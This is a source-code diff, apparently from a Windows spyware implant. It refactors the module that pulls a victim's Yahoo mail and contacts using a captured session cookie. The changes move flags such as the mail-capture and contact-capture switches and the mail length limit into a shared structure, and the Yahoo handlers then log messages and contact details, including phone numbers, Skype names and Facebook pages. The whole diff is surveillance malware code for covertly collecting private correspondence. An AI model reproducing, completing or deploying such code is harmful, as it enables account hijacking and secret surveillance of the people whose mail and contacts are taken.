@@ -2,6 +2,7 @@
 #include <stdio.h>
 #include <time.h>
 #include "..\common.h"
+#include "../bss.h"
 #include "..\LOG.h"
 #include "SocialMain.h"
 #include "NetworkHandler.h"
@@ -11,11 +12,6 @@
 extern char *base64_encodeY(const unsigned char *input, int length);
 extern unsigned char *base64_decodeY(const char *input, int length, int *outlen);
 
-extern BOOL bPM_MailCapStarted; // variabili per vedere se gli agenti interessati sono attivi
-extern BOOL bPM_ContactsStarted; 
-extern BOOL bPM_IMStarted;
-
-extern DWORD max_social_mail_len;
 extern BOOL DumpContact(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page, DWORD flags);
 
 extern DWORD GetLastFBTstamp(char *user, DWORD *hi_part);
@@ -473,7 +469,7 @@ DWORD YahooContactHandler(LPSTR strCookie)
 {		
 	YAHOO_CONNECTION_PARAMS YHParams;
 
-	if (!bPM_ContactsStarted)
+	if (!shared.bPM_ContactsStarted)
 		return SOCIAL_REQUEST_SUCCESS;
 
 	SecureZeroMemory(&YHParams, sizeof(YHParams));
@@ -633,8 +629,8 @@ DWORD YHParseMailBox(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 			if(dwRet == YAHOO_SUCCESS)
 			{
 				dwLen = strlen(strMail);
-				if(dwLen > max_social_mail_len)
-					dwLen = max_social_mail_len;
+				if(dwLen > shared.max_social_mail_len)
+					dwLen = shared.max_social_mail_len;
 				CheckProcessStatus();
 				LogSocialMailMessageFull(MAIL_YAHOO, (BYTE *)strMail, dwLen, bIncoming, bDraft);
 			}
@@ -2926,7 +2922,7 @@ DWORD YHFreeConnectionParams(LPYAHOO_CONNECTION_PARAMS pYHParams)
 
 DWORD YahooMessageHandler(LPSTR strCookie)
 {
-	if (!bPM_MailCapStarted)
+	if (!shared.bPM_MailCapStarted)
 		return SOCIAL_REQUEST_SUCCESS;
 
 	//json params
